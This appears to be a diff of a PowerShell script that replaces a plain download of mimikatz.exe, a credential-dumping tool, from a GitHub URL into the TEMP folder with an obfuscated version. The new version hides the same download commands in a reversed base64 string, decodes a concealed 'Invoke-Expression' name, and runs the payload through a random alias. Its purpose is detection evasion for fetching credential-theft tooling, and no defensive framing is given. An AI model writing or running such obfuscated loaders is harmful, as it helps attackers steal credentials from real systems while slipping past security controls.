@@ -1,3 +1,11 @@
-$u = "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimikatz.exe"
-$f = "$env:TEMP\mimi.exe"
-Invoke-WebRequest $u -OutFile $f
+$best64code = "mRCIlxWaGRXdP1CI1RCI0NXZ1FXZSJWZX1SZr9mdulkCNISZ4VmLp1WatxFUNVEV6YnblRiIg0DImRiCNISZ4VmL6RXYrlWbp12L0YDevIXZ0NXYt9ie0F2ap1Wat9yYlNFdvJnchB1Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHaiASPgUHJ" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
+$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
+$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
+$RandomSTR64 = '40bpN1cFJFc4VULlt0T25US'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
+$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
+$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
+$aliasSTR64 = 'gdFdWS'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
+$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
+$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
+$nULL = new-AliaS -nAMe $AliAsFInaL -vaLuE $IExcmD -ForcE ; & $AliAsFiNal $LoaDcOde ;
